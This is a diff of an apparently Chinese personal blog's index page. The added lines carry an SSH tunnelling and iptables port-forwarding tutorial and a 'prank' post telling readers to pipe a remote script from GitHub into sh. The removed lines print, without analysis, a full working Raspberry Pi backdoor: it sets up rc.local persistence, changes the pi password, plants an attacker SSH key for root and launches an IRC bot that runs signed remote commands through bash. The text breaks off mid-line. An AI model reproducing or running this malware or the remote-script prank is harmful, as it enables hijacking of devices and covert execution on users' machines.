@@ -176,6 +176,172 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-yuque/SSH 命令的三种代理功能（-L!-R!-D）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/13/yuque/SSH%20%E5%91%BD%E4%BB%A4%E7%9A%84%E4%B8%89%E7%A7%8D%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD%EF%BC%88-L!-R!-D%EF%BC%89/">SSH 命令的三种代理功能（-L/-R/-D）</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/13/yuque/SSH%20%E5%91%BD%E4%BB%A4%E7%9A%84%E4%B8%89%E7%A7%8D%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD%EF%BC%88-L!-R!-D%EF%BC%89/" class="archive-article-date">
+  	<time datetime="2021-02-13T10:11:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-13</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>ssh 命令除了登陆外还有三种代理功能：</p>
+<ul>
+<li>正向代理（-L）：相当于 iptable 的 port forwarding</li>
+<li>反向代理（-R）：相当于 frp 或者 ngrok</li>
+<li>socks5 代理（-D）：相当于 ss/ssr</li>
+</ul>
+<p>如要长期高效的服务，应使用对应的专用软件。如没法安装软件，比如当你处在限制环境下想要访问下某个不可达到的目标，或者某个临时需求，那么 ssh 就是你的兜底方案。</p>
+<p><strong>正向代理：</strong><br>所谓“正向代理”就是在本地启动端口，把本地端口数据转发到远端。<br>用法 1：远程端口映射到其他机器<br>HostB 上启动一个 PortB 端口，映射到 HostC:PortC 上，在 HostB 上运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HostB$ ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC</span><br></pre></td></tr></table></figure>
+
+<p>这时访问 HostB:PortB 相当于访问 HostC:PortC（和 iptable 的 port-forwarding 类似）。<br>用法 2：本地端口通过跳板映射到其他机器<br>HostA 上启动一个 PortA 端口，通过 HostB 转发到 HostC:PortC 上，在 HostA 上运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HostA$ ssh -L 0.0.0.0:PortA:HostC:PortC  user@HostB</span><br></pre></td></tr></table></figure>
+
+<p>这时访问 HostA:PortA 相当于访问 HostC:PortC。<br>两种用法的区别是，第一种用法本地到跳板机 HostB 的数据是明文的，而第二种用法一般本地就是 HostA，访问本地的 PortA，数据被 ssh 加密传输给 HostB 又转发给 HostC:PortC。<br><strong>反向代理：</strong><br>所谓“反向代理”就是让远端启动端口，把远端端口数据转发到本地。<br>HostA 将自己可以访问的 HostB:PortB 暴露给外网服务器 HostC:PortC，在 HostA 上运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HostA$ ssh -R HostC:PortC:HostB:PortB  user@HostC</span><br></pre></td></tr></table></figure>
+
+<p>那么链接 HostC:PortC 就相当于链接 HostB:PortB。使用时需修改 HostC 的 /etc/ssh/sshd_config，添加：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GatewayPorts yes</span><br></pre></td></tr></table></figure>
+
+<p>相当于内网穿透，比如 HostA 和 HostB 是同一个内网下的两台可以互相访问的机器，HostC 是外网跳板机，HostC 不能访问 HostA，但是 HostA 可以访问 HostC。<br>那么通过在内网 HostA 上运行 <code>ssh -R</code> 告诉 HostC，创建 PortC 端口监听，把该端口所有数据转发给我（HostA），我会再转发给同一个内网下的 HostB:PortB。<br>同内网下的 HostA/HostB 也可以是同一台机器，换句话说就是<strong>内网 HostA 把自己可以访问的端口暴露给了外网 HostC。</strong><br>按照前文《<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/57477087">韦易笑：内网穿透：在公网访问你家的 NAS</a>》中，相当于再 HostA 上启动了 frpc，而再 HostC 上启动了 frps。</p>
+<p><strong>本地 socks5 代理</strong><br>在 HostA 的本地 1080 端口启动一个 socks5 服务，通过本地 socks5 代理的数据会通过 ssh 链接先发送给 HostB，再从 HostB 转发送给远程主机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HostA$ ssh -D localhost:1080  HostB</span><br></pre></td></tr></table></figure>
+
+<p>那么在 HostA 上面，浏览器配置 socks5 代理为 127.0.0.1:1080，看网页时就能把数据通过 HostB 代理出去，类似 ss/ssr 版本，只不过用 ssh 来实现。</p>
+<p><strong>使用优化</strong><br>为了更好用一点，ssh 后面还可以加上：<code>-CqTnN</code> 参数，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -CqTnN -L 0.0.0.0:PortA:HostC:PortC  user@HostB</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>-C</code> 为压缩数据，<code>-q</code> 安静模式，<code>-T</code> 禁止远程分配终端，<code>-n</code> 关闭标准输入，<code>-N</code> 不执行远程命令。此外视需要还可以增加 <code>-f</code> 参数，把 ssh 放到后台运行。<br>这些 ssh 代理没有短线重连功能，链接断了命令就退出了，所以需要些脚本监控重启，或者使用 autossh 之类的工具保持链接。<br><strong>功能对比</strong><br>正向代理（-L）的第一种用法可以用 iptable 的 port-forwarding 模拟，iptable 性能更好，但是需要 root 权限，ssh -L 性能不好，但是正向代理花样更多些。反向代理（-R）一般就作为没有安装 frp/ngrok/shootback 时候的一种代替，但是数据传输的性能和稳定性当然 frp 这些专用软件更好。<br>socks5 代理（-D）其实是可以代替 ss/ssr 的，区别和上面类似。所以要长久使用，推荐安装对应软件，临时用一下 ssh 挺顺手。</p>
+<p>–<br>补充下 iptable 的 <code>port-forwarding</code> 怎么设置，十分管用的功能，两个函数即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;bin&#x2F;sh</span><br><span class="line"># create forward rule by source interface</span><br><span class="line"># http:&#x2F;&#x2F;serverfault.com&#x2F;questions&#x2F;532569&#x2F;how-to-do-port-forwarding-redirecting-on-debian</span><br><span class="line">PortForward1() &#123;</span><br><span class="line">    local IN_IF&#x3D;$1</span><br><span class="line">    local IN_PORT&#x3D;$2</span><br><span class="line">    local OUT_IP&#x3D;$3</span><br><span class="line">    local OUT_PORT&#x3D;$4</span><br><span class="line">    local IPTBL&#x3D;&quot;&#x2F;sbin&#x2F;iptables&quot;</span><br><span class="line">    echo &quot;1&quot; &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br><span class="line">    $IPTBL -A PREROUTING -t nat -i $IN_IF -p tcp --dport $IN_PORT -j DNAT --to-destination $&#123;OUT_IP&#125;:$&#123;OUT_PORT&#125;</span><br><span class="line">    $IPTBL -A FORWARD -p tcp -d $OUT_IP --dport $OUT_PORT -j ACCEPT</span><br><span class="line">    $IPTBL -A POSTROUTING -t nat -j MASQUERADE</span><br><span class="line">&#125;</span><br><span class="line"># create forward rule by source ip</span><br><span class="line"># http:&#x2F;&#x2F;blog.csdn.net&#x2F;zzhongcy&#x2F;article&#x2F;details&#x2F;42738285</span><br><span class="line">ForwardPort2() &#123;</span><br><span class="line">    local IN_IP&#x3D;$1</span><br><span class="line">    local IN_PORT&#x3D;$2</span><br><span class="line">    local OUT_IP&#x3D;$3</span><br><span class="line">    local OUT_PORT&#x3D;$4</span><br><span class="line">    local IPTBL&#x3D;&quot;&#x2F;sbin&#x2F;iptables&quot;</span><br><span class="line">    echo &quot;1&quot; &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br><span class="line">    $IPTBL -t nat -A PREROUTING --dst $IN_IP -p tcp --dport $IN_PORT -j DNAT --to-destination $&#123;OUT_IP&#125;:$&#123;OUT_PORT&#125;</span><br><span class="line">    $IPTBL -t nat -A POSTROUTING --dst $OUT_IP -p tcp --dport $OUT_PORT -j SNAT --to-source $IN_IP</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个函数是按照网卡名称设置转发：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PortForward1 eth1 8765 202.115.8.2 8765</span><br></pre></td></tr></table></figure>
+
+<p>这时，本地 eth1 网卡的 8765 端口就会被转发给 202.115.8.2 的 8765 端口。<br>第二个函数是按照本机的 ip 地址，比如本机是 192.168.1.2：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PortForward2 192.168.1.2 8765 202.115.8.2 8765</span><br></pre></td></tr></table></figure>
+
+<p>那么任何访问本机 192.168.1.2 这个地址 8765 端口，都会被转发到 202.115.8.2:8765<br>这个 iptable 的 <code>port forwarding</code> 是内核层运行的，性能极好，只不过每次重启都需要重新设置下。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/13/yuque/SSH%20%E5%91%BD%E4%BB%A4%E7%9A%84%E4%B8%89%E7%A7%8D%E4%BB%A3%E7%90%86%E5%8A%9F%E8%83%BD%EF%BC%88-L!-R!-D%EF%BC%89/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-yuque/整蛊小程序" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/26/yuque/%E6%95%B4%E8%9B%8A%E5%B0%8F%E7%A8%8B%E5%BA%8F/">整蛊小程序</a>
+    </h1>
+  
+
+        
+        <a href="/2021/01/26/yuque/%E6%95%B4%E8%9B%8A%E5%B0%8F%E7%A8%8B%E5%BA%8F/" class="archive-article-date">
+  	<time datetime="2021-01-26T12:27:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="中午-12-点以后才能发作"><a href="#中午-12-点以后才能发作" class="headerlink" title="中午 12 点以后才能发作"></a>中午 12 点以后才能发作</h3><h2 id="Mac-版本"><a href="#Mac-版本" class="headerlink" title="Mac 版本"></a>Mac 版本</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1612456252512-9464128e-baa8-4e90-982d-40f9ac06b5d5.png#align=left&display=inline&height=182&margin=%5Bobject%20Object%5D&name=image.png&originHeight=364&originWidth=318&size=46979&status=done&style=none&width=159" alt="image.png"><br>打开 终端 输入下面命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/zy84338719/-static/main/app.sh )</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭</span></span><br><span class="line">ps -ax |grep happy</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 6663 ttys001    0:00.00 happy</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="built_in">kill</span> -9 6663</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/01/26/yuque/%E6%95%B4%E8%9B%8A%E5%B0%8F%E7%A8%8B%E5%BA%8F/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-yuque/python 日常办公" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1032,169 +1198,9 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-yuque/被黑脚本" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/28/yuque/%E8%A2%AB%E9%BB%91%E8%84%9A%E6%9C%AC/">被黑脚本</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/28/yuque/%E8%A2%AB%E9%BB%91%E8%84%9A%E6%9C%AC/" class="archive-article-date">
-  	<time datetime="2020-09-28T16:57:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">MYSELF=`realpath <span class="variable">$0</span>`</span><br><span class="line">DEBUG=/dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$MYSELF</span> &gt;&gt; <span class="variable">$DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -ne 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	NEWMYSELF=`mktemp -u <span class="string">&#x27;XXXXXXXX&#x27;</span>`</span><br><span class="line">	sudo cp <span class="variable">$MYSELF</span> /opt/<span class="variable">$NEWMYSELF</span></span><br><span class="line">	sudo sh -c <span class="string">&quot;echo &#x27;#!/bin/sh -e&#x27; &gt; /etc/rc.local&quot;</span></span><br><span class="line">	sudo sh -c <span class="string">&quot;echo /opt/<span class="variable">$NEWMYSELF</span> &gt;&gt; /etc/rc.local&quot;</span></span><br><span class="line">	sudo sh -c <span class="string">&quot;echo &#x27;exit 0&#x27; &gt;&gt; /etc/rc.local&quot;</span></span><br><span class="line">	sleep 1</span><br><span class="line">	sudo reboot</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">TMP1=`mktemp`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$TMP1</span> &gt;&gt; <span class="variable">$DEBUG</span></span><br><span class="line"></span><br><span class="line">killall bins.sh</span><br><span class="line">killall minerd</span><br><span class="line">killall node</span><br><span class="line">killall nodejs</span><br><span class="line">killall ktx-armv4l</span><br><span class="line">killall ktx-i586</span><br><span class="line">killall ktx-m68k</span><br><span class="line">killall ktx-mips</span><br><span class="line">killall ktx-mipsel</span><br><span class="line">killall ktx-powerpc</span><br><span class="line">killall ktx-sh4</span><br><span class="line">killall ktx-sparc</span><br><span class="line">killall arm5</span><br><span class="line">killall zmap</span><br><span class="line">killall kaiten</span><br><span class="line">killall perl</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;127.0.0.1 bins.deutschland-zahlung.eu&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line">rm -rf /root/.bashrc</span><br><span class="line">rm -rf /home/pi/.bashrc</span><br><span class="line"></span><br><span class="line">usermod -p \<span class="variable">$6</span>\<span class="variable">$vGkGPKUr</span>\<span class="variable">$heqvOhUzvbQ66Nb0JGCijh</span>/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi</span><br><span class="line"></span><br><span class="line">mkdir -p /root/.ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B&quot;</span>  &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> &gt;&gt; /etc/resolv.conf</span><br><span class="line">rm -rf /tmp/ktx*</span><br><span class="line">rm -rf /tmp/cpuminer-multi</span><br><span class="line">rm -rf /var/tmp/kaiten</span><br><span class="line"></span><br><span class="line">cat &gt; /tmp/public.pem &lt;&lt;<span class="string">EOFMARKER</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs</span></span><br><span class="line"><span class="string">glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW</span></span><br><span class="line"><span class="string">rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF</span></span><br><span class="line"><span class="string">WRq+Z8HYMvPlgSRA3wIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">EOFMARKER</span></span><br><span class="line"></span><br><span class="line">BOT=`mktemp -u <span class="string">&#x27;XXXXXXXX&#x27;</span>`</span><br><span class="line"></span><br><span class="line">cat &gt; /tmp/<span class="variable">$BOT</span> &lt;&lt;<span class="string">&#x27;EOFMARKER&#x27;</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">SYS=`uname -a | md5sum | awk -F<span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">NICK=a<span class="variable">$&#123;SYS:24&#125;</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="literal">true</span> ]; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">	arr[0]=<span class="string">&quot;ix1.undernet.org&quot;</span></span><br><span class="line">	arr[1]=<span class="string">&quot;ix2.undernet.org&quot;</span></span><br><span class="line">	arr[2]=<span class="string">&quot;Ashburn.Va.Us.UnderNet.org&quot;</span></span><br><span class="line">	arr[3]=<span class="string">&quot;Bucharest.RO.EU.Undernet.Org&quot;</span></span><br><span class="line">	arr[4]=<span class="string">&quot;Budapest.HU.EU.UnderNet.org&quot;</span></span><br><span class="line">	arr[5]=<span class="string">&quot;Chicago.IL.US.Undernet.org&quot;</span></span><br><span class="line">	rand=$[<span class="variable">$RANDOM</span> % 6]</span><br><span class="line">	svr=<span class="variable">$&#123;arr[$rand]&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">eval</span> <span class="string">&#x27;exec 3&lt;&gt;/dev/tcp/$svr/6667;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">continue</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$NICK</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;NICK $NICK\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">continue</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;USER user 8 * :IRC hi\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">continue</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Main loop</span></span><br><span class="line">	<span class="keyword">while</span> [ <span class="literal">true</span> ]; <span class="keyword">do</span></span><br><span class="line">		<span class="built_in">eval</span> <span class="string">&quot;read msg_in &lt;&amp;3;&quot;</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">break</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>  [[ <span class="string">&quot;<span class="variable">$msg_in</span>&quot;</span> =~ <span class="string">&quot;PING&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">printf</span> <span class="string">&quot;PONG %s\n&quot;</span> <span class="string">&quot;<span class="variable">$&#123;msg_in:5&#125;</span>&quot;</span>;</span><br><span class="line">			<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;PONG %s\r\n&quot; &quot;$&#123;msg_in:5&#125;&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">			<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">			sleep 1</span><br><span class="line">			<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;JOIN #biret\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">			<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">		<span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$msg_in</span>&quot;</span> =~ <span class="string">&quot;PRIVMSG&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">			privmsg_h=$(<span class="built_in">echo</span> <span class="variable">$msg_in</span>| cut -d<span class="string">&#x27;:&#x27;</span> -f 3)</span><br><span class="line">			privmsg_data=$(<span class="built_in">echo</span> <span class="variable">$msg_in</span>| cut -d<span class="string">&#x27;:&#x27;</span> -f 4)</span><br><span class="line">			privmsg_nick=$(<span class="built_in">echo</span> <span class="variable">$msg_in</span>| cut -d<span class="string">&#x27;:&#x27;</span> -f 2 | cut -d<span class="string">&#x27;!&#x27;</span> -f 1)</span><br><span class="line"></span><br><span class="line">			<span class="built_in">hash</span>=`<span class="built_in">echo</span> <span class="variable">$privmsg_data</span> | base64 -d -i | md5sum | awk -F<span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">			sign=`<span class="built_in">echo</span> <span class="variable">$privmsg_h</span> | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$sign</span>&quot;</span> == <span class="string">&quot;<span class="variable">$hash</span>&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">				CMD=`<span class="built_in">echo</span> <span class="variable">$privmsg_data</span> | base64 -d -i`</span><br><span class="line">				RES=`bash -c <span class="string">&quot;<span class="variable">$CMD</span>&quot;</span> | base64 -w 0`</span><br><span class="line">				<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;PRIVMSG $privmsg_nick :$RES\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">				<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">				<span class="keyword">fi</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">EOFMARKER</span><br><span class="line"></span><br><span class="line">chmod +x /tmp/<span class="variable">$BOT</span></span><br><span class="line">nohup /tmp/<span class="variable">$BOT</span> 2&gt;&amp;1 &gt; /tmp/bot.log &amp;</span><br><span class="line">rm /tmp/nohup.log -rf</span><br><span class="line">rm 